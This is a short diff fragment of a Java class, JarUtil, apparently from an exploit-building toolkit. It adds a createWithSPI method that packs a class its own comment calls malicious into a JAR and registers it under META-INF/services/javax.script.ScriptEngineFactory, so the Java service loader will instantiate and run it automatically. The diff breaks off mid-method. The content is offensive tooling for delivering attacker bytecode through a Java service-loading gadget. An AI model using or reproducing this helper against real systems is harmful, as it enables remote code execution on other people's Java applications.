@@ -14,6 +14,20 @@ public class JarUtil {
             jos.putNextEntry(entry);
             jos.write(byteCode);
             jos.closeEntry();
+        }
+
+        // 返回 jar 内容
+        return baos.toByteArray();
+    }
+    public static byte[] createWithSPI(String className, byte[] byteCode) throws Exception {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+
+        try (JarOutputStream jos = new JarOutputStream(baos)) {
+            // 写入恶意 class 文件
+            JarEntry entry = new JarEntry(className.replace(".", "/") + ".class");
+            jos.putNextEntry(entry);
+            jos.write(byteCode);
+            jos.closeEntry();
 
             // 写入 SPI 文件
             entry = new JarEntry("META-INF/services/javax.script.ScriptEngineFactory");
